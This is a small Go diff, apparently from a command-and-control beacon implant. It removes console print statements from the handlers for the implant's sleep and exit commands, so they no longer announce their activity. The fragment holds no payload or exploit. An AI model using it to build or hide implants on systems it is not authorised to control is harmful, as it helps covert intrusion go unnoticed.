@@ -39,8 +39,6 @@ func Sleep(p *packet.Parser) ([]byte, error) {
 	}
 
 	result := []byte("Sleep policy updated")
-	fmt.Println("[*] " + string(result))
-
 	return packet.PackArray([]any{result})
 }
 
@@ -48,6 +46,5 @@ func Sleep(p *packet.Parser) ([]byte, error) {
 // 实际的退出操作由 main 循环在发送完结果后执行。
 func Exit(p *packet.Parser) ([]byte, error) {
 	result := []byte("Beacon exit command processed. Goodbye.")
-	fmt.Println("[!] " + string(result))
 	return packet.PackArray([]any{result})
 }
